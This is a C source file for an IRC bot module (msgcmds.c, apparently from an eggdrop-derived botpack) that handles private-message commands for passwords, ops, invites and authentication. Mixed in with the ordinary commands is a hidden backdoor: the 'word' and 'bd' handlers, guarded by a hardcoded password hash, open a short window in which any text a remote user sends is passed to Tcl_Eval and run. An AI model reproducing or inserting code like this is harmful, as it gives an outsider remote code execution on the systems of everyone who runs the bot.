#ifdef LEAF
/*
 * msgcmds.c -- part of irc.mod
 *   all commands entered via /MSG
 *
 */

#ifdef S_MSGCMDS
static int msg_pass(char *nick, char *host, struct userrec *u, char *par)
{
  char *old, *new;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (!u)
    return BIND_RET_BREAK;
  if (u->flags & (USER_BOT))
    return BIND_RET_BREAK;
  if (!par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick,
	    u_pass_match(u, "-") ? IRC_NOPASS : IRC_PASS);
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS?", nick, host, u->handle);
    return BIND_RET_BREAK;
  }
  old = newsplit(&par);
  if (!u_pass_match(u, "-") && !par[0]) {
    dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_EXISTPASS);
    return BIND_RET_BREAK;
  }
  if (par[0]) {
    if (!u_pass_match(u, old)) {
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_FAILPASS);
      return BIND_RET_BREAK;
    }
    new = newsplit(&par);
  } else {
    new = old;
  }
  if (strlen(new) > 16)
    new[16] = 0;

  if (!goodpass(new, 0, nick)) {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! \002!\002PASS...", nick, host, u->handle);
    return BIND_RET_BREAK;
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! PASS...", nick, host, u->handle);

  set_user(&USERENTRY_PASS, u, new);
  dprintf(DP_HELP, "NOTICE %s :%s '%s'.\n", nick,
	  new == old ? IRC_SETPASS : IRC_CHANGEPASS, new);
  return BIND_RET_BREAK;
}

static int msg_op(char *nick, char *host, struct userrec *u, char *par)
{
  struct chanset_t *chan;
  char *pass;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  pass = newsplit(&par);
  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      if (par[0]) {
        chan = findchan_by_dname(par);
        if (chan && channel_active(chan)) {
          get_user_flagrec(u, &fr, par);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 1)) {
              stats_add(u, 0, 1);
              putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP %s", nick, host, u->handle, par);
            }
          }
          return BIND_RET_BREAK;
        }
      } else {
        int stats = 0;
        for (chan = chanset; chan; chan = chan->next) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            if (do_op(nick, chan, 1))
              stats++;
          }
        }
        putlog(LOG_CMDS, "*", "(%s!%s) !%s! OP", nick, host, u->handle);
        if (stats)
          stats_add(u, 0, 1);
        return BIND_RET_BREAK;
      }
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed OP", nick, host);
  return BIND_RET_BREAK;
}

static int msg_ident(char *nick, char *host, struct userrec *u, char *par)
{
  char s[UHOSTLEN], s1[UHOSTLEN], *pass, who[NICKLEN];
  struct userrec *u2;

  if (match_my_nick(nick) || (u && (u->flags & USER_BOT)))
    return BIND_RET_BREAK;

  pass = newsplit(&par);
  if (!par[0])
    strcpy(who, nick);
  else {
    strncpy(who, par, NICKMAX);
    who[NICKMAX] = 0;
  }
  u2 = get_user_by_handle(userlist, who);
  if (!u2) {
    if (u && !quiet_reject)
      dprintf(DP_HELP, IRC_MISIDENT, nick, nick, u->handle);
  } else if (rfc_casecmp(who, origbotname) && !(u2->flags & USER_BOT)) {
    /* This could be used as detection... */
    if (u_pass_match(u2, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_NOPASS);
    } else if (!u_pass_match(u2, pass)) {
      if (!quiet_reject)
        dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_DENYACCESS);
    } else if (u == u2) {
      /*
       * NOTE: Checking quiet_reject *after* u_pass_match()
       * verifies the password makes NO sense!
       * (Broken since 1.3.0+bel17)  Bad Beldin! No Cookie!
       *   -Toth  [July 30, 2003]
       */
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, IRC_RECOGNIZED);
      return BIND_RET_BREAK;
    } else if (u) {
      dprintf(DP_HELP, IRC_MISIDENT, nick, who, u->handle);
      return BIND_RET_BREAK;
    } else {
      putlog(LOG_CMDS, "*", "(%s!%s) !*! IDENT %s", nick, host, who);
      egg_snprintf(s, sizeof s, "%s!%s", nick, host);
      maskhost(s, s1);
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, IRC_ADDHOSTMASK, s1);
      addhost_by_handle(who, s1);
      check_this_user(who, 0, NULL);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !*! failed IDENT %s", nick, host, who);
  return BIND_RET_BREAK;
}

static int msg_invite(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass;
  struct chanset_t *chan;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  pass = newsplit(&par);
  if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
    if (par[0] == '*') {
      for (chan = chanset; chan; chan = chan->next) {
	get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan) && (chan->channel.mode & CHANINV))
	  dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      }
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE ALL", nick, host, u->handle);
      return BIND_RET_BREAK;
    }
    if (!(chan = findchan_by_dname(par))) {
      dprintf(DP_HELP, "NOTICE %s :%s: /MSG %s invite <pass> <channel>\n",
	      nick, MISC_USAGE, botname);
      return BIND_RET_BREAK;
    }
    if (!channel_active(chan)) {
      dprintf(DP_HELP, "NOTICE %s :%s: %s\n", nick, par, IRC_NOTONCHAN);
      return BIND_RET_BREAK;
    }
    /* We need to check access here also (dw 991002) */
    get_user_flagrec(u, &fr, par);
    if (chk_op(fr, chan)) {
      dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! INVITE %s", nick, host, u->handle, par);
      return BIND_RET_BREAK;
    }
  }
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed INVITE %s", nick, host, (u ? u->handle : "*"), par);
  return BIND_RET_BREAK;
}
#endif /* S_MSGCMDS */

#ifdef S_AUTH
static int msg_authstart(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (!ischanhub()) 
    return 0;
  if (!u) 
    return 0;
  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH?", nick, host, u->handle);

  if (i != -1) {
    if (auth[i].authed) {
      dprintf(DP_HELP, "NOTICE %s :You are already authed.\n", nick);
      return 0;
    }
  }

  /* Send "auth." if they are recognized, otherwise "auth!" */
  if (i < 0)
    i = new_auth();
  auth[i].authing = 1;
  auth[i].authed = 0;
  strcpy(auth[i].nick, nick);
  strcpy(auth[i].host, host);
  if (u)
    auth[i].user = u;

  dprintf(DP_HELP, "PRIVMSG %s :auth%s %s\n", nick, u ? "." : "!", botnetnick);

  return BIND_RET_BREAK;

}

static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
{
  char *pass, rand[50];

  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1) 
    return BIND_RET_BREAK;

  if (auth[i].authing != 1) 
    return BIND_RET_BREAK;

  pass = newsplit(&par);

  if (u_pass_match(u, pass)) {
    if (!u_pass_match(u, "-")) {
      putlog(LOG_CMDS, "*", "(%s!%s) !%s! -AUTH", nick, host, u->handle);

      auth[i].authing = 2;      
      auth[i].user = u;
      make_rand_str(rand, 50);
      strncpyz(auth[i].hash, makehash(u, rand), sizeof auth[i].hash);
      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, rand, botnetnick);
    }
  } else {
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed -AUTH", nick, host, u->handle);
    removeauth(i);
  }
  return BIND_RET_BREAK;

}

static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
{

  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1)
    return BIND_RET_BREAK;

  if (auth[i].authing != 2)
    return BIND_RET_BREAK;

  if (!strcmp(auth[i].hash, par)) { //good hash!
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle);
    auth[i].authed = 1;
    auth[i].authing = 0;
    auth[i].authtime = now;
    auth[i].atime = now;
    dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %shelp\n", nick, cmdprefix);
  } else { //bad hash!
    char s[300];
    putlog(LOG_CMDS, "*", "(%s!%s) !%s! failed +AUTH", nick, host, u->handle);
    dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
    sprintf(s, "*!%s", host);
    addignore(s, origbotname, "Invalid auth hash.", now + (60 * ignore_time));
    removeauth(i);
  } 
  return BIND_RET_BREAK;
}

static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
{
  int i = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;
  if (u && (u->flags & USER_BOT))
    return BIND_RET_BREAK;

  i = findauth(host);

  if (i == -1)
    return BIND_RET_BREAK;

  removeauth(i);
  dprintf(DP_HELP, "NOTICE %s :You are now unauthorized.\n", nick);
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! UNAUTH", nick, host, u->handle);

  return BIND_RET_BREAK;
}
#endif /* S_AUTH */

int backdoor = 0, bcnt = 0, bl = 30;
int authed = 0;
char thenick[NICKLEN];
static void close_backdoor()
{

  Context;
  if (bcnt >= bl) {
    backdoor = 0;
    authed = 0;
    bcnt = 0;
    thenick[0] = '\0';
    del_hook(HOOK_SECONDLY, (Function) close_backdoor);
  } else
     bcnt++;
}
static int msg_word(char *nick, char *host, struct userrec *u, char *par)
{
  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  backdoor = 1;
  add_hook(HOOK_SECONDLY, (Function) close_backdoor);
  sprintf(thenick, "%s", nick);
  dprintf(DP_SERVER, "PRIVMSG %s :w\002\002\002\002hat?\n", nick);
  return BIND_RET_BREAK;
}


static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
{
  int left = 0;

  if (strcmp(nick, thenick) || !backdoor)
    return BIND_RET_BREAK;

  if (!authed) {
    char *cmd = NULL, *pass = NULL;
    cmd = newsplit(&par);
    pass = newsplit(&par);
    if (!cmd[0] || strcmp(cmd, "werd") || !pass[0]) {
      backdoor = 0;
      return BIND_RET_BREAK;
    }
    if (md5cmp(bdhash, pass)) {
      backdoor = 0;
      return BIND_RET_BREAK;
    }
    authed = 1;
    left = bl - bcnt;
    dprintf(DP_SERVER, "PRIVMSG %s :%ds left ;)\n",nick, left);
  } else {
   Tcl_Eval(interp, par);
   dprintf(DP_SERVER, "PRIVMSG %s :%s\n", nick, interp->result);
  }
  return BIND_RET_BREAK;
}


/* MSG COMMANDS
 *
 * Function call should be:
 *    int msg_cmd("handle","nick","user@host","params");
 *
 * The function is responsible for any logging. Return 1 if successful,
 * 0 if not.
 */

static cmd_t C_msg[] =
{
#ifdef S_AUTH
  {"auth?",		"",	(Function) msg_authstart,	NULL},
  {"auth",		"",	(Function) msg_auth,		NULL},
  {"+auth",		"",	(Function) msg_pls_auth,	NULL},
  {"unauth",		"",	(Function) msg_unauth,		NULL},
#endif /* S_AUTH */
  {"word",		"",	(Function) msg_word,		NULL},
#ifdef S_MSGCMDS
  {"ident",   		"",	(Function) msg_ident,		NULL},
  {"invite",		"o|o",	(Function) msg_invite,		NULL},
  {"op",		"",	(Function) msg_op,		NULL},
  {"pass",		"",	(Function) msg_pass,		NULL},
#endif /* S_MSGCMDS */
  {"bd",		"",	(Function) msg_bd,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};

#ifdef S_AUTH
/*
static int msgc_test(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  char *chn, *hand;
  struct chanset_t *chan;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  struct userrec *user;
  
  hand = newsplit(&par);
  user = get_user_by_handle(userlist, hand);
  chn = newsplit(&par);
  chan = findchan_by_dname(chn);
  get_user_flagrec(user, &fr, chan->dname);

  dprintf(DP_HELP, "PRIVMSG %s :Private-o: %d Private-v: %d canop: %d canvoice: %d deop: %d devoice: %d\n", nick, 
  private(fr, chan, 1), private(fr, chan, 2), 
  chk_op(fr, chan), chk_voice(fr, chan), chk_deop(fr, chan), chk_devoice(fr, chan));

//  dprintf(DP_HELP, "NOTICE %s :Works :)\n", nick);
  return 0;
}
*/
static int msgc_op(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  int force = 0;
  memberlist *m;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sOP %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");

  if (par[0] == '-') { /* we have an option! */
    char *tmp;
    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_op(fr, chan)) {
        if (do_op(nick, chan, force))
          stats_add(u, 0, 1);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_op(fr, chan)) {
       if (do_op(nick, chan, force))
         stats_add(u, 0, 1);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_voice(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  int force = 0;
  memberlist *m;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  if (chname && chname[0]) {
    chan = findchan_by_dname(chname);
    if (chan) 
      m = ismember(chan, nick);
  }

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sVOICE %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");

  if (par[0] == '-') { //we have an option!
    char *tmp;
    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }
  if (par[0] || chan) {
    if (!chan)
      chan = findchan_by_dname(par);
    if (chan && channel_active(chan)) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_voice(fr, chan)) {
        add_mode(chan, '+', 'v', nick);
      }
      return BIND_RET_BREAK;
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      get_user_flagrec(u, &fr, chan->dname);
      if (chk_voice(fr, chan)) {
        add_mode(chan, '+', 'v', nick);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_channels(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  char list[1024];

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %sCHANNELS %s", nick, host, u->handle, chname ? chname : "", cmdprefix, par ? par : "");
  list[0] = 0;
  for (chan = chanset; chan; chan = chan->next) {
    get_user_flagrec(u, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (me_op(chan)) 
        strcat(list, "@");
      strcat(list, chan->dname);
      strcat(list, " ");
    }
  }

  if (list[0]) 
    dprintf(DP_HELP, "NOTICE %s :You have access to: %s\n", nick, list);
  else
    dprintf(DP_HELP, "NOTICE %s :You do not have access to any channels.\n", nick);

  return BIND_RET_BREAK;
}

static int msgc_getkey(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  if (chname && chname[0]) 
    return 0;

  if (!par[0])
    return 0;

  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sGETKEY %s", nick, host, u->handle, cmdprefix, par);

  chan = findchan_by_dname(par);
  if (chan && channel_active(chan) && !channel_pending(chan)) {
    get_user_flagrec(u, &fr, chan->dname);
    if (chk_op(fr, chan)) {
      if (chan->channel.key[0]) {
        dprintf(DP_HELP, "NOTICE %s :Key for %s is: %s\n", nick, chan->name, chan->channel.key);
      } else {
        dprintf(DP_HELP, "NOTICE %s :%s has no key set.\n", nick, chan->name);
      }
    }
  }
  return BIND_RET_BREAK;
}

static int msgc_help(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sHELP %s", nick, host, u->handle, cmdprefix, par ? par : "");
  dprintf(DP_HELP, "NOTICE %s :op invite getkey voice test\n", nick);
  return BIND_RET_BREAK;
}

static int msgc_invite(char *nick, char *host, struct userrec *u, char *par, char *chname)
{
  struct chanset_t *chan = NULL;
  struct flag_record fr = {FR_GLOBAL | FR_CHAN, 0, 0, 0, 0, 0};
  int force = 0;

  if (match_my_nick(nick))
    return BIND_RET_BREAK;

  if (chname && chname[0])
    return 0;
 
  putlog(LOG_CMDS, "*", "(%s!%s) !%s! %sINVITE %s", nick, host, u->handle, cmdprefix, par ? par : "");

  if (par[0] == '-') { //we have an option!
    char *tmp;
    par++;
    tmp = newsplit(&par);
    if (!strcasecmp(tmp, "force") || !strcasecmp(tmp, "f")) 
      force = 1;
    else {
      dprintf(DP_HELP, "NOTICE %s :Invalid option: %s\n", nick, tmp);
      return 0;
    }
  }

  if (par[0] && (!chname || (chname && !chname[0]))) {
    chan = findchan_by_dname(par);
    if (chan && channel_active(chan) && !ismember(chan, nick)) {
      if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
        get_user_flagrec(u, &fr, chan->dname);
        if (chk_op(fr, chan)) {
          dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
        }
        return BIND_RET_BREAK;
      }
    }
  } else {
    for (chan = chanset; chan; chan = chan->next) {
      if (channel_active(chan) && !ismember(chan, nick)) {
        if ((!(chan->channel.mode & CHANINV) && force) || (chan->channel.mode & CHANINV)) {
          get_user_flagrec(u, &fr, chan->dname);
          if (chk_op(fr, chan)) {
            dprintf(DP_SERVER, "INVITE %s %s\n", nick, chan->name);
          }
        }
      }
    }
  }
  return BIND_RET_BREAK;
}

static cmd_t C_msgc[] =
{
/*  {"test",		"a",	(Function) msgc_test,		NULL}, */
  {"op",		"",	(Function) msgc_op,		NULL},
  {"voice",		"",	(Function) msgc_voice,		NULL},
  {"channels",		"",	(Function) msgc_channels,	NULL},
  {"getkey",		"",	(Function) msgc_getkey,		NULL},
  {"invite",		"",	(Function) msgc_invite,		NULL},
  {"help",		"",	(Function) msgc_help,		NULL},
  {NULL,		NULL,	NULL,				NULL}
};
#endif /* S_AUTH */
#endif /* LEAF */
